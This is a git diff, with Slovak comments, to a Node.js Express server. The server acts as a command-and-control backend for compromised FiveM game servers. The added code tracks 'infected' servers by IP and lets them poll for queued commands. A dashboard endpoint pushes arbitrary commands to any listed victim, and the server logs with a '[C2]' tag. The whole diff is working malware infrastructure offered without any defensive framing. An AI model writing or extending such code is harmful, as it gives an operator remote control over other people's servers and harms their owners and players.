@@ -6,27 +6,26 @@ const app = express();
 app.use(express.json());
 app.use(cors());
 
-// --- OPRAVA CESTY ---
-// Ak máš server.js v hlavnom priečinku a index.html v priečinku 'frontend'
+// Statické súbory
 const frontendPath = path.join(__dirname, 'frontend'); 
 app.use(express.static(frontendPath));
 
 let infectedServers = []; 
+let serverCommands = {}; // Tu sa budú ukladať príkazy čakajúce na vykonanie (podľa IP)
 
-// Endpoint pre FiveM servery (hlásenie statusu)
+// --- ENDPOINTY PRE FIVEM SERVER ---
+
+// 1. Prijímanie reportu zo servera
 app.post('/api/report', (req, res) => {
+    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const cleanIp = rawIp.replace('::ffff:', '').split(',')[0].trim();
+
     const newServer = {
-        // Získame IP adresu (ošetrenie proxy z Renderu)
-        ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
+        ip: cleanIp,
         hostname: req.body.hostname || "Neznámy Server",
         players: req.body.players || 0,
         lastSeen: new Date().toLocaleTimeString('sk-SK')
     };
-
-    // Odstránime IPv6 prefix ak existuje
-    if (newServer.ip.includes('::ffff:')) {
-        newServer.ip = newServer.ip.replace('::ffff:', '');
-    }
 
     const index = infectedServers.findIndex(s => s.ip === newServer.ip);
     if (index > -1) { 
@@ -38,17 +37,51 @@ app.post('/api/report', (req, res) => {
     res.status(200).send({ status: "ok" });
 });
 
-// Endpoint pre tvoj web (zoznam všetkých serverov)
+// 2. FiveM server si tadiaľto sťahuje príkazy (Polling)
+app.get('/api/get-commands', (req, res) => {
+    const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const cleanIp = rawIp.replace('::ffff:', '').split(',')[0].trim();
+    
+    // Ak sú pre túto IP nejaké príkazy, pošleme ich a hneď vymažeme z fronty
+    const cmds = serverCommands[cleanIp] || [];
+    serverCommands[cleanIp] = []; 
+    
+    res.json(cmds);
+});
+
+
+// --- ENDPOINTY PRE WEB DASHBOARD ---
+
+// 3. Zoznam serverov pre hlavnú stránku
 app.get('/api/list', (req, res) => {
     res.json(infectedServers);
 });
 
-// Obsluha hlavnej stránky
+// 4. Odoslanie príkazu z webu do fronty
+app.post('/api/send-command', (req, res) => {
+    const { ip, command } = req.body;
+    
+    if (!ip || !command) {
+        return res.status(400).send({ error: "Chýba IP alebo príkaz" });
+    }
+
+    if (!serverCommands[ip]) {
+        serverCommands[ip] = [];
+    }
+
+    serverCommands[ip].push(command);
+    console.log(`[C2] Príkaz "${command}" pridaný do fronty pre IP: ${ip}`);
+    
+    res.json({ status: "queued", command: command });
+});
+
+
+// --- OBSLUHA STRÁNOK ---
+
 app.get('/', (req, res) => {
     res.sendFile(path.join(frontendPath, 'index.html'));
 });
 
-// Obsluha manage stránky (aby fungovala adresa tvojweb.com/manage)
 app.get('/manage', (req, res) => {
     res.sendFile(path.join(frontendPath, 'manage.html'));
 });
